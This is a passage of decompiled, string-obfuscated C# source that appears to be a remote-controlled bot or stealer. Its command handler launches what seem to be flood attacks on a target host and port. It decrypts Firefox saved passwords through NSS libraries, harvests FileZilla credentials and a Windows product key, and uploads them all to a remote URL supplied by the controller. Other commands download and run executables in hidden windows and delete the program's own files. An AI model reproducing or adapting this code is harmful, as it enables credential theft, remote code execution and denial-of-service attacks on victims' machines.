		string text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + GClass2.smethod_0("MŝɠʹѤՠ٧ݫ\u0829\u094e੮୴ౠ\u0d62\u0e6c\u0f7aၝ");
		LoadLibrary(text + GClass2.smethod_0("aŤɰ\u036aѺճط\u073c\u082a१੮୭"));
		LoadLibrary(text + GClass2.smethod_0("gŻɷʹбԪ٧ݮ\u086d"));
		LoadLibrary(text + GClass2.smethod_0("xūɥ\u0331Ъէٮݭ"));
		LoadLibrary(text + GClass2.smethod_0("yŤɣ\u0375бԪ٧ݮ\u086d"));
		LoadLibrary(text + GClass2.smethod_0("xŹɼͼѮժضܪࡧ८੭"));
		LoadLibrary(text + GClass2.smethod_0("xŻɥ\u0361ѳգضܪࡧ८੭"));
		LoadLibrary(text + GClass2.smethod_0("bŸɹͼѼծ٪\u0736\u082a१੮୭"));
		LoadLibrary(text + GClass2.smethod_0("\u007fŤɬͽѧլ٨\u0736\u082a१੮୭"));
		intptr_0 = LoadLibrary(text + GClass2.smethod_0("fŴɵ\u0336Ъէٮݭ"));
		Delegate0 @delegate = (Delegate0)Marshal.GetDelegateForFunctionPointer(GetProcAddress(intptr_0, GClass2.smethod_0("FŔɕ\u035aэխ٫ݵ")), typeof(Delegate0));
		return @delegate(string_14);
	}

	public static int smethod_11(IntPtr intptr_1, IntPtr intptr_2, StringBuilder stringBuilder_0, int int_0)
	{
		Delegate3 @delegate = (Delegate3)Marshal.GetDelegateForFunctionPointer(GetProcAddress(intptr_0, GClass2.smethod_0("Xņɇ\u0351ѳբٵ\u0739࠺\u0952\u0a48୮౩൦\u0e6cར၄ᅰቢ፥ᑧᕳ")), typeof(Delegate3));
		return @delegate(intptr_1, intptr_2, stringBuilder_0, int_0);
	}

	private static void smethod_12(string string_14)
	{
		try
		{
			string[] array = string_14.Split(new char[1] { '*' });
			if (string_14.StartsWith(GClass2.smethod_0("{žɨ\u0363Ѩլ٭ݥ")))
			{
				try
				{
					Class0.string_0 = array[1];
					Class0.int_0 = Convert.ToInt32(array[2]);
					Class0.int_2 = Convert.ToInt32(array[3]);
					Class0.int_1 = Convert.ToInt32(array[4]);
					Class0.smethod_0();
				}
				catch
				{
				}
			}
			if (string_14.StartsWith(GClass2.smethod_0("ażɳͶѣը٬ݭࡥ")))
			{
				try
				{
					Class6.string_0 = array[1];
					Class6.int_0 = Convert.ToInt32(array[2]);
					Class6.smethod_0();
				}
				catch
				{
				}
			}
			if (string_14.StartsWith(GClass2.smethod_0("}ţɶ\u0363Ѩլ٭ݥ")))
			{
				try
				{
					Class8.string_0 = array[1];
					Class8.int_0 = Convert.ToInt32(array[2]);
					Class8.int_2 = Convert.ToInt32(array[3]);
					Class8.int_3 = Convert.ToInt32(array[4]);
					Class8.int_1 = Convert.ToInt32(array[5]);
					Class8.smethod_0();
				}
				catch
				{
				}
			}
			if (string_14.StartsWith(GClass2.smethod_0("`ūɪͶѣը٬ݭࡥ")))
			{
				try
				{
					Class4.string_0 = array[1];
					Class4.int_1 = Convert.ToInt32(array[2]);
					Class4.int_3 = Convert.ToInt32(array[3]);
					Class4.int_0 = Convert.ToInt32(array[4]);
					Class4.int_2 = Convert.ToInt32(array[5]);
					Class4.smethod_0();
				}
				catch
				{
				}
			}
			if (string_14.StartsWith(GClass2.smethod_0("vŰɦ\u0363ѭ")))
			{
				try
				{
					string text = string.Empty;
					_ = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + GClass2.smethod_0("MŝɠʹѤՠ٧ݫ\u0829\u094e੮୴ౠ\u0d62\u0e6c\u0f7aၝ");
					string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GClass2.smethod_0("Eŕɸ\u036cѼոٿݳࡍ\u0956੦\u0b7c౨൪\u0e64\u0f72ၕᅘት፩ᑣᕭᙯᝧᡲ"));
					try
					{
						string[] array2 = directories;
						foreach (string text2 in array2)
						{
							string[] files = Directory.GetFiles(text2);
							foreach (string input in files)
							{
								if (Regex.IsMatch(input, GClass2.smethod_0("}Ťɫ\u0365ѥէٻܩ\u0875ॴ੨୪\u0c76\u0d64")))
								{
									smethod_10(text2);
									string_11 = input;
								}
							}
						}
						DataTable dataTable = new GClass1(string_11).method_2(GClass2.smethod_0("Jŝɛ\u0353іՀس\u0738࠱\u0956\u0a5d\u0b41\u0c40ബ\u0e66ཥ\u1073ᅗቫ፩ᑢᕭ᙭\u1771ᠺ"));
						Struct0 struct0_ = default(Struct0);
						Struct0 struct0_2 = default(Struct0);
						smethod_13(smethod_14(), bool_23: true, 0L);
						foreach (DataRow row in dataTable.Rows)
						{
							object obj5 = text;
							text = string.Concat(obj5, GClass2.smethod_0("]Ŭɪʹѣլ\u0670ݦ࠸ड"), row[GClass2.smethod_0("`ŨɵͱѪբٯݤ")], GClass2.smethod_0("\v"));
							StringBuilder stringBuilder = new StringBuilder(row[GClass2.smethod_0("tžɬͼѴռٿݯ\u086dढ़ੴ\u0b63౷൪\u0e62\u0f6f\u1064")].ToString());
							Struct0 struct0_3 = (Struct0)Marshal.PtrToStructure(new IntPtr(smethod_11(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length)), typeof(Struct0));
							if (smethod_15(ref struct0_3, ref struct0_, 0) == 0 && struct0_.int_2 != 0)
							{
								byte[] array3 = new byte[struct0_.int_2];
								Marshal.Copy(new IntPtr(struct0_.int_1), array3, 0, struct0_.int_2);
								text = text + GClass2.smethod_0("LŨɢ;Ѿճ٭ݵࡨ।੩୦సഡ") + Encoding.ASCII.GetString(array3) + GClass2.smethod_0("\v");
							}
							StringBuilder stringBuilder2 = new StringBuilder(row[GClass2.smethod_0("tžɬͼѴռٿݯ\u086dक़੦୵\u0c76൳\u0e6c\u0f70ၥ")].ToString());
							Struct0 struct0_4 = (Struct0)Marshal.PtrToStructure(new IntPtr(smethod_11(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length)), typeof(Struct0));
							if (smethod_15(ref struct0_4, ref struct0_2, 0) == 0 && struct0_2.int_2 != 0)
							{
								byte[] array3 = new byte[struct0_2.int_2];
								Marshal.Copy(new IntPtr(struct0_2.int_1), array3, 0, struct0_2.int_2);
								text = text + GClass2.smethod_0("ZŨɻʹѱժٶݷ࠸ड") + Encoding.ASCII.GetString(array3) + GClass2.smethod_0("\v");
							}
							text += GClass2.smethod_0("\v");
						}
					}
					catch
					{
					}
					if (text != string.Empty)
					{
						string_12 = string_12 + GClass2.smethod_0("¢ƭʬίҮ\u05a9ڨ\u07abࢪ\u0955\u0a54\u0b57\u0c56\u0d51๐ནၒᅝቜ\u135fᑞᕙᙘ\u175bᡚ᥅ᩄᭇ᱆ᵁṀὃ⁂⅍≌⍏\u244e╉♈❋⡊⥵⩴⭷ⱖ\u2d71\u2e70⽳ひㅽ㉼㍿㑾㕹㙸㝻㡺㥯㨈㬤㰾㴮㸬㼦䀰䅧䈖䌤䐷䔰䘵䜮䠲䥛䩍䬝䰖䴑丐伓倒儝刜匟吞唙嘘圛堚夥娄嬇将崁帀弃怂愍戌挏搎攉昈朋栊椵樴欷氶洱渰漳瀲焽爼猿琾甹瘸眻砺礥稤笧簦紡縠缣耢脭般茯萮蔩蘈蜋") + text;
					}
					string text3 = string.Empty;
					string text4 = string.Empty;
					try
					{
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GClass2.smethod_0("FşɱͻѳՏٽݿ\u087e॰\u0a4c\u0b7c౧൹\u0e69ས\u106bᅧቩ፠ᑣᕷᘪ\u177bᡯᥭ"));
						foreach (XmlNode item in xmlDocument.DocumentElement!.SelectNodes(GClass2.smethod_0("]Ũɾͽѯջٻܨࡕॠ੶୵౧൳"))!)
						{
							string value = item.SelectSingleNode(GClass2.smethod_0("LŬɱ\u0375"))!.FirstChild!.Value;
							string value2 = item.SelectSingleNode(GClass2.smethod_0("QŰɧͳ"))!.FirstChild!.Value;
							string value3 = item.SelectSingleNode(GClass2.smethod_0("TŢɱͲ"))!.FirstChild!.Value;
							string value4 = item.SelectSingleNode(GClass2.smethod_0("TŬɰ\u0375"))!.FirstChild!.Value;
							string text5 = text3;
							text3 = text5 + GClass2.smethod_0("[Ţɴͳѡձظܡ") + value + GClass2.smethod_0("\u0005Ōɨ\u0362Ѿվٳݭ\u0875२\u0a64୩౦സม") + value2 + GClass2.smethod_0("\u0001ŚɨͻѴձ٪ݶ\u0877सਡ") + value3 + GClass2.smethod_0("\rŖɪͶѷԸء") + value4 + GClass2.smethod_0("\bċ");
						}
					}
					catch
					{
					}
					try
					{
						XmlDocument xmlDocument2 = new XmlDocument();
						xmlDocument2.Load(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GClass2.smethod_0("@ŝɳ\u0375ѽՍٿݹ\u0878ॲ\u0a4e\u0b63\u0c75൬\u0e6bལၸᅸቯ፻ᑾᕢᙴ\u1776ᠪ\u197b\u1a6f\u1b6d"));
						foreach (XmlNode item2 in xmlDocument2.DocumentElement!.SelectNodes(GClass2.smethod_0("FŶɱʹѾջ\u065dݨ\u087eॽ੯\u0b7b౻ന๕འၶᅵቧ፳"))!)
						{
							string value5 = item2.SelectSingleNode(GClass2.smethod_0("LŬɱ\u0375"))!.FirstChild!.Value;
							string value6 = item2.SelectSingleNode(GClass2.smethod_0("QŰɧͳ"))!.FirstChild!.Value;
							string value7 = item2.SelectSingleNode(GClass2.smethod_0("TŢɱͲ"))!.FirstChild!.Value;
							string value8 = item2.SelectSingleNode(GClass2.smethod_0("TŬɰ\u0375"))!.FirstChild!.Value;
							string text5 = text4;
							text4 = text5 + GClass2.smethod_0("[Ţɴͳѡձظܡ") + value5 + GClass2.smethod_0("\u0005Ōɨ\u0362Ѿվٳݭ\u0875२\u0a64୩౦സม") + value6 + GClass2.smethod_0("\u0001ŚɨͻѴձ٪ݶ\u0877सਡ") + value7 + GClass2.smethod_0("\rŖɪͶѷԸء") + value8 + GClass2.smethod_0("\bċ");
						}
					}
					catch
					{
					}
					if ((text3 != string.Empty) | (text4 != string.Empty))
					{
						string_12 = string_12 + GClass2.smethod_0("¢ƭʬίҮ\u05a9ڨ\u07abࢪ\u0955\u0a54\u0b57\u0c56\u0d51๐ནၒᅝቜ\u135fᑞᕙᙘ\u175bᡚ᥅ᩄᭇ᱆ᵁṀὃ⁂⅍≌⍏\u244e╉♈❋⡊⥵⩴⭷ⱖ\u2d71\u2e70⽳ひㅽ㉼㍿㑾㕹㙸㝻㡺㥯㨈㬤㰠㴮㸐㼠䀤䄫䈧䍥䐔䔢䘱䜲䠷䥐䩌䭙䱏䴛丐伓倒儝刜匟吞唙嘘圛堚夥娄嬇将崁帀弃怂愍戌挏搎攉昈朋栊椵樴欷氶洱渰漳瀲焽爼猿琾甹瘸眻砺礥稤笧簦紡縠缣耢脭般茯萮蔩蘈蜋") + text3 + text4;
					}
					string text6 = string.Empty;
					string text7 = string.Empty;
					try
					{
						RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(GClass2.smethod_0("|Łɋ\u0358ќՋ\u065bݍ\u087bॺ੨\u0b4d\u0c40\u0d50\u0e4eནၰᅸቩፀᑇᕍᙰ\u1776ᡳ\u1979\u1a62᭧\u1c33ᵜṅὌ⁓⅍≸⍾⑹╯♧❼⡑⥣⩷⭷ⱪ\u2d6d\u2e6f"));
						if (registryKey != null)
						{
							text6 = (string)registryKey.GetValue(GClass2.smethod_0("[Ÿɦ\u036cѲեٱ\u074aࡢ९\u0a64")) + GClass2.smethod_0(")") + smethod_1() + GClass2.smethod_0("(");
						}
						RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(GClass2.smethod_0("|Łɋ\u0358ќՋ\u065bݍ\u087bॺ੨\u0b4d\u0c40\u0d50\u0e4eནၰᅸቩፀᑇᕍᙰ\u1776ᡳ\u1979\u1a62᭧\u1c33ᵜṅὌ⁓⅍≸⍾⑹╯♧❼⡑⥣⩷⭷ⱪ\u2d6d\u2e6f"));
						if (registryKey2 != null)
						{
							text7 = Class3.smethod_0((byte[])registryKey2.GetValue(GClass2.smethod_0("TŦɩ\u0364Ѹժ٦ݙ\u087a२\u0a62୰౧൷\u0e4bཥ"), RegistryValueKind.DWord));
						}
					}
					catch
					{
					}
					if ((text6 != string.Empty) | (text7 != string.Empty))
					{
						string text5 = string_12;
						string_12 = text5 + GClass2.smethod_0("¢ƭʬίҮ\u05a9ڨ\u07abࢪ\u0955\u0a54\u0b57\u0c56\u0d51๐ནၒᅝቜ\u135fᑞᕙᙘ\u175bᡚ᥅ᩄᭇ᱆ᵁṀὃ⁂⅍≌⍏\u244e╉♈❋⡊⥵⩴⭷ⱖ\u2d71\u2e70⽳ひㅽ㉼㍿㑾㕹㙸㝻㡺㥯㨙㬤㰢㴯㸥㼾䀻䅧䈅䌁䑩䔈䘧䜸䡠䤕䨔䬗䰖䴑丐伓倒儝刜匟吞唙嘘圛堚夥娄嬇将崁帀弃怂愍戌挏搎攉昈朋栊椵樴欷氶洱渰漳瀲焽爼猿琾甹瘸眻砺礥稤笧簦紡縠缣耢脭般茯萮蔩蘈蜋") + text6 + GClass2.smethod_0("8ġ") + text7 + GClass2.smethod_0("\v");
					}
					try
					{
						StreamWriter streamWriter = new StreamWriter(Environment.GetEnvironmentVariable(GClass2.smethod_0("Pņɏ\u0351")) + GClass2.smethod_0("]") + Environment.MachineName + GClass2.smethod_0("*ůɭ\u0366"));
						streamWriter.Write(string_12);
						streamWriter.Close();
					}
					catch
					{
					}
					try
					{
						ServicePointManager.Expect100Continue = false;
						new WebClient().UploadFile(array[1], GClass2.smethod_0("TŌɑ\u0355"), Environment.GetEnvironmentVariable(GClass2.smethod_0("Pņɏ\u0351")) + GClass2.smethod_0("]") + Environment.MachineName + GClass2.smethod_0("*ůɭ\u0366"));
					}
					catch
					{
					}
					try
					{
						File.Delete(Environment.GetEnvironmentVariable(GClass2.smethod_0("Pņɏ\u0351")) + GClass2.smethod_0("]") + Environment.MachineName + GClass2.smethod_0("*ůɭ\u0366"));
					}
					catch
					{
					}
				}
				catch
				{
				}
			}
			if (string_14.StartsWith(GClass2.smethod_0("nŦɿ\u0369ѧի٠ݦ\u087a।")))
			{
				try
				{
					string text8 = gclass0_0.NextString(12) + GClass2.smethod_0("*Ŧɺ\u0364");
					new WebClient().DownloadFile(array[1], Environment.GetEnvironmentVariable(GClass2.smethod_0("Pņɏ\u0351")) + GClass2.smethod_0("]") + text8);
					Process process = new Process();
					process.StartInfo.FileName = Environment.GetEnvironmentVariable(GClass2.smethod_0("Pņɏ\u0351")) + GClass2.smethod_0("]") + text8;
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process.Start();
				}
				catch
				{
				}
			}
			if (string_14.StartsWith(GClass2.smethod_0("sŭɰ\u036bѵ")))
			{
				try
				{
					Process process2 = new Process();
					process2.StartInfo = new ProcessStartInfo(array[1]);
					process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process2.Start();
				}
				catch
				{
				}
			}
			if (string_14.StartsWith(GClass2.smethod_0("sŵɠ\u0362Ѷդ")))
			{
				try
				{
					string text9 = gclass0_0.NextString(12) + GClass2.smethod_0("*Ŧɺ\u0364");
					new WebClient().DownloadFile(array[1], Environment.GetEnvironmentVariable(GClass2.smethod_0("Pņɏ\u0351")) + GClass2.smethod_0("]") + text9);
					Process process3 = new Process();
					process3.StartInfo.FileName = Environment.GetEnvironmentVariable(GClass2.smethod_0("Pņɏ\u0351")) + GClass2.smethod_0("]") + text9;
					process3.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process3.Start();
				}
				catch
				{
				}
				try
				{
					string value9 = GClass2.smethod_0("6řɯ\u0379ѭզٲ\u070fࡠ०੮ଡ") + '"' + Environment.GetCommandLineArgs()[0] + '"' + GClass2.smethod_0("\0Šɮ\u0327ѣս٭ݰ\u0876ड") + '"' + Path.GetFileName(Application.get_ExecutablePath()) + '"' + GClass2.smethod_0(",Ŭɥͽѧԧ\u0654ݠ\u0874०\u0a63୵");
					TextWriter textWriter = new StreamWriter(Environment.GetEnvironmentVariable(GClass2.smethod_0("Pņɏ\u0351")) + GClass2.smethod_0("WŮɬ\u0364Ѣղ٠ܪࡡ\u0963\u0a75"));
					textWriter.WriteLine(value9);
					textWriter.Close();
					Process process4 = new Process();
					process4.StartInfo.FileName = Environment.GetEnvironmentVariable(GClass2.smethod_0("Pņɏ\u0351")) + GClass2.smethod_0("WŮɬ\u0364Ѣղ٠ܪࡡ\u0963\u0a75");
					process4.StartInfo.UseShellExecute = false;
					process4.StartInfo.CreateNoWindow = true;
					process4.Start();
				}
				catch
				{
				}
				Environment.Exit(0);
			}
			if (!((string_14.StartsWith(GClass2.smethod_0("tŠɩ\u036cѴդ")) & (array[1] == Environment.MachineName)) | (array[1] == GClass2.smethod_0("BŎɍ"))))
			{
				return;
			}
			try
			{
				if (bool_20)
				{
					Registry.LocalMachine.OpenSubKey(GClass2.smethod_0("~Ńɍ\u035eўՉ\u0655\u0743\u0879३\u0a4a\u0b41\u0c53൏\u0e6c\u0f71ၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯⑻╻♮❩⡫⥘⩑⭷Ɐ"), writable: true)!.DeleteValue(GClass2.smethod_0("GŊȭ\u034dѾծ٠ݧ\u0827\u0942\u0a77୭\u0c75൧\u0e73"));
				}
				else
				{
					Registry.CurrentUser.OpenSubKey(GClass2.smethod_0("~Ńɍ\u035eўՉ\u0655\u0743\u0879३\u0a4a\u0b41\u0c53൏\u0e6c\u0f71ၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯⑻╻♮❩⡫⥘⩑⭷Ɐ"), writable: true)!.DeleteValue(GClass2.smethod_0("GŊȭ\u034dѾծ٠ݧ\u0827\u0942\u0a77୭\u0c75൧\u0e73"));
				}
			}
			catch
			{
			}
			try
			{
				string value10 = GClass2.smethod_0("6řɯ\u0379ѭզٲ\u070fࡠ०੮ଡ") + '"' + Environment.GetCommandLineArgs()[0] + '"' + GClass2.smethod_0("\0Šɮ\u0327ѣս٭ݰ\u0876ड") + '"' + Path.GetFileName(Application.get_ExecutablePath()) + '"' + GClass2.smethod_0(",Ŭɥͽѧԧ\u0654ݠ\u0874०\u0a63୵");
				TextWriter textWriter2 = new StreamWriter(Environment.GetEnvironmentVariable(GClass2.smethod_0("Pņɏ\u0351")) + GClass2.smethod_0("WŮɬ\u0364Ѣղ٠ܪࡡ\u0963\u0a75"));
				textWriter2.WriteLine(value10);
				textWriter2.Close();
				Process process5 = new Process();
				process5.StartInfo.FileName = Environment.GetEnvironmentVariable(GClass2.smethod_0("Pņɏ\u0351")) + GClass2.smethod_0("WŮɬ\u0364Ѣղ٠ܪࡡ\u0963\u0a75");
				process5.StartInfo.UseShellExecute = false;
				process5.StartInfo.CreateNoWindow = true;
				process5.Start();
			}
			catch
			{
			}
			Environment.Exit(0);
		}
		catch
		{
		}
	}

	public static long smethod_13(long long_0, bool bool_23, long long_1)
	{
		Delegate2 @delegate = (Delegate2)Marshal.GetDelegateForFunctionPointer(GetProcAddress(intptr_0, GClass2.smethod_0("AśȾ\u033fђՍپݾࡡ७੩୲౬൧\u0e62\u0f76\u1064")), typeof(Delegate2));
		return @delegate(long_0, bool_23, long_1);
	}

	public static long smethod_14()
	{
		Delegate1 @delegate = (Delegate1)Marshal.GetDelegateForFunctionPointer(GetProcAddress(intptr_0, GClass2.smethod_0("GŝȤ\u0325ьՕٴݤࡆॠ\u0a79୩౹\u0d64\u0e68ཤ၌ᅣቼፗᑯᕭᙵ")), typeof(Delegate1));
		return @delegate();
	}

	public static int smethod_15(ref Struct0 struct0_0, ref Struct0 struct0_1, int int_0)
	{
		Delegate4 @delegate = (Delegate4)Marshal.GetDelegateForFunctionPointer(GetProcAddress(intptr_0, GClass2.smethod_0("_Ņȼ\u033dјՎ\u065bݗࡃ\u0963੦୶౺൲\u0e75")), typeof(Delegate4));
		return @delegate(ref struct0_0, ref struct0_1, int_0);
	}

	public static void smethod_16()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(string_6, string_7, (MessageBoxButtons)0, (MessageBoxIcon)16);
	}
}
